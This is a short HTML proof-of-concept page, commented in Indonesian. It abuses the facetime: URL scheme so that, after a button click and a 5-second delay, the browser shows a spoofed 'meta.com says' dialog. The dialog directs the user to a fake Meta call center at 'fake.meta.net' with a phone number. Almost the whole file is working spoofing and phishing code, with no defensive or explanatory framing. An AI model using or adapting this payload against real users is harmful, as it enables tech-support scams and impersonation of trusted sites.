<!DOCTYPE html>
<html>
  <body>
    <!-- Button yang memicu fungsi bb() saat diklik -->
    <button onclick="bb()">Click Here</button>

    <script>
      function bb() {
        // Menyusun teks yang ingin dimasukkan ke dalam URL
        var message = 'meta.com says:%0a%0dMetaDown!%0aGo%20to%20fake.meta.net%20Call%20Center%0a%0dCall:0987-65432';
        
        // Encode seluruh URL agar aman untuk digunakan dalam href
        var encodedMessage = encodeURIComponent(message);
        
        // Membuat elemen link untuk FaceTime
        var link = document.createElement('a');
        link.href = 'facetime:' + encodedMessage;
        
        // Menunda eksekusi selama 5 detik sebelum mengeksekusi link.click()
        setTimeout(function() {
          link.click(); // Simulasikan klik untuk FaceTime (meskipun ini tidak akan berhasil karena format invalid)
        }, 5000); // Delay 5 detik (5000 ms)
      }
    </script>
  </body>
</html>
